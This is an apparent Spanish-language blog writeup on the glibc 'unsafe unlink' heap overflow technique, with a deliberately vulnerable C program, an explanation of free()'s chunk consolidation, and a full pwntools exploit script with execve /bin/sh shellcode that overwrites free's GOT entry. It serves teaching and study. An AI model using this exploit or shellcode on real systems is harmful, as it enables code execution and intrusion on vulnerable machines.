---
layout: post
title: Unlink SploitFUN
comments: true
categories: [Pwn, Writeups, SploitFUN]
---

Estudiando sobre Heap Overflows, llegué a la página de [sploitfun](https://sploitfun.wordpress.com/2015/02/26/heap-overflow-using-unlink/), donde se explicaba sobre una técnica que abusa el algoritmo para consolidar trozos al ser liberados en un heap. Me pareció interesante, por lo que hice esta versión simplificada y en castellano del post.

# Overview

Vamos a explotar una técnica de *Heap Overflow* conocida como ***unlink*** ó ***unsafe unlink***.

# Reconocimiento

Se nos da el siguiente programa:

```c
/* 
 Heap overflow vulnerable program. 
*/

#include <stdlib.h>
#include <string.h>

int main( int argc, char * argv[] )
{
        char * first, * second;

first = malloc( 666 ); /*[1]*/
second = malloc( 12 ); /*[2]*/
if(argc!=1) 
	strcpy( first, argv[1] ); /*[3]*/

free( first ); /*[4]*/
free( second ); /*[5]*/

return( 0 ); /*[6]*/
}
```

Podemos ver que en la línea 3 se produce un *Heap Overflow* ya que se copia el input del usuario en `first` sin ninguna comprobación. El heap se vería así:

![Image]({{ site.baseurl }}/images/posts/2024-10-21-Unlink-SploitFUN-1.png)

## Técnica [[unlink]]

> [_Unlink_](https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_unlink_snip.c):  The main idea of this technique is to trick ‘glibc malloc’ to unlink the ‘second’ chunk. While unlinking GOT entry of free would get overwritten with shellcode address!! After successful overwrite, now when free is called by vulnerable program at line [5], shellcode would get executed. Not very clear? No problem, first lets see what ‘glibc malloc’ does when free gets executed.

Es decir, queremos hacer que el chunk `second` sea "unlinkeado", de forma que cuando se esté desenlazando, la entrada en la *GOT* de `free` se sobrescriba con un *shellcode* y al llamarse en la línea 5, se ejecute dicho shellcode.

### Explicación

Sin la influencia de un atacante, **free** hace lo siguiente (para chunks [*non mmaped*](https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L10), es decir fruto de una llamada a `mmap`):

- Consolidar hacia detrás (**consolidate backwards**):
	- Comprueba si *el chunk previo está libre* - Si el actual tiene el bit `PREV_INUSE (P)` en 0. En nuestro caso no está libre (`first` tiene el bit activo). Por defecto, el chunk previo al primer chunk del heap tiene este bit activo aunque no esté libre.
	- *Si está libre*, se desenlaza (**unlink**) el chunk previo de su *bin*, se suman los tamaños del actual y el anterior, y se mueve el chunk pointer al chunk previo. En nuestro caso, no está libre, por lo que no se realiza esta operatoria.
- Consolidar hacia delante (**consolidate forward**):
	- Comprueba si *el siguiente chunk está libre* - Comprueba si el siguiente al siguiente tiene el bit `PREV_INUSE (P)` en 0, para ello avanza al siguiente chunk sumando `size` al chunk pointer, y repite la operación para llegar al siguiente. En nuestro caso, comprobará el bit del `top`, que dirá que el anterior (`second`) no está libre.
	- *Si está libre*, se desenlaza (**unlink**) el chunk siguiente de su *bin*, se suman los tamaños del actual y el siguiente. En nuestro caso, no está libre, por lo que no se realiza esta operatoria.
- Finalmente, en caso de realizarse una consolidación, se añade el resultado a la bin correspondiente.

# Explotación

Pongamos ahora, que mediante el [[Heap Overflow]] de la línea 3, un atacante sobrescribe las cabeceras de `second` de forma que quedan:

```
prev_size = PREV_INUSE bit a 0 (numero par)
size = -4
fd = dirección de free – 12
bk = dirección de un shellcode
```

Como hemos logrado manipular las cabeceras, al invocarse **free**, el comportamiento será diferente:

1. Como *no es mmaped*, trata de consolidar:
2. Consolidar hacia atrás:
	- Comprueba si el chunk previo está libre, en este casó lo está, pero al ser `first` el chunk siguiente al primer chunk del heap, tiene por defecto el bit `PREV_INUSE (P)` activado por defecto. Por tanto, no podemos consolidar hacia atrás.
3. Consolidar hacia delante:
	- Normalmente, el siguiente chunk al siguiente sería `top`. Sin embargo, como hemos sobrescrito el tamaño de `second` con `-4`, el siguiente chunk empezaría a partir de un offset de 4 bytes del `second`, tratando el campo `PREV_INUSE (P)` de `second` como el del siguiente chunk, como hemos puesto un valor par, interpretará que es 0, es decir que está libre.
	- Como está "libre", consolida hacia delante:
		1. Copia `fd` y `bk` de `second` en las variables `FD` y `BK`, en nuestro caso:  `FD = dirección de free - 12` y `BK = direccion de un shellcode`.
		2. `BK` se copia 12 bytes después de `FD`, en nuestro caso, apunta a la dirección en la *GOT* de *free*, de forma que en caso de llamar a *free*, se ejecutará el shellcode.
4. Finalmente se añade el chunk consolidado a una bin.

El heap después de introducirse los datos se vería:

![Image]({{ site.baseurl }}/images/posts/2024-10-21-Unlink-SploitFUN-2.png)

Sabiendo todo esto, podemos crear un script en python utilizando *pwntools*:

```python
#!/bin/python3
from pwn import *

# Dirección de la función 'free' en la GOT (obtenida con objdump)
FUNCTION_POINTER = 0x0804978c 
# Dirección de la variable 'first' en el ejecutable vulnerable
CODE_ADDRESS = 0x0804a008 + 0x10 

# Nombre del binario vulnerable
VULNERABLE = './vuln'
DUMMY = 0xdefaced
PREV_INUSE = 0x1

# Shellcode
shellcode = (
    b"\xeb\x0a"          # Jump 10 bytes
    b"ssppppffff"        # Si no hacemos este salto, la llamada a unlink nos corrompe el shellcode
    b"\x31\xc0"          # xor eax, eax
    b"\x50"              # push eax
    b"\x68\x2f\x2f\x73\x68"  # push '//sh'
    b"\x68\x2f\x62\x69\x6e"  # push '/bin'
    b"\x89\xe3"          # mov ebx, esp
    b"\x50"              # push eax
    b"\x89\xe2"          # mov edx, esp
    b"\x53"              # push ebx
    b"\x89\xe1"          # mov ecx, esp
    b"\xb0\x0b"          # mov al, 11 (syscall execve)
    b"\xcd\x80"          # int 0x80 (syscall)
)

# Conexión al binario vulnerable
io = process(VULNERABLE)

# Generar payload
payload = b""
payload += p32(DUMMY)  # fd of first chunk
payload += p32(DUMMY)  # bk of first chunk
payload += p32(DUMMY)  # fd_nextsize of first chunk
payload += p32(DUMMY)  # bk_nextsize of first chunk
payload += shellcode   # Copiar shellcode

# Padding
padding_length = 680 - 4*4 - (4*4 + len(shellcode))
payload += b"B" * padding_length

# Campos del segundo chunk
payload += p32(DUMMY & ~PREV_INUSE)  # prev_size of second chunk
payload += p32(-4)  # size of second chunk
payload += p32(FUNCTION_POINTER - 12)  # fd del segundo chunk
payload += p32(CODE_ADDRESS)  # bk del segundo chunk (dirección del shellcode)

# Enviar el payload
io.sendline(payload)

# Interactuar con la shell
io.interactive()
```

Si ejecutamos, veremos que somos capaces de spawnear una shell.

Sin embargo, a día de hoy, existen diversas protecciones que prevendrán este ataque:

- **Double free check**
- **Invalid next size**
- **Corrupted double linked list**

Por lo que aunque en sistemas antiguos podamos realizarlo, para implementaciones más modernas debemos utilizar técnicas más sofisticadas que trataremos en próximos posts. Si te ha interesado y quieres profundizar en el tema, te recomiendo leer el paper [Vudo malloc tricks](http://phrack.org/issues/57/8.html).
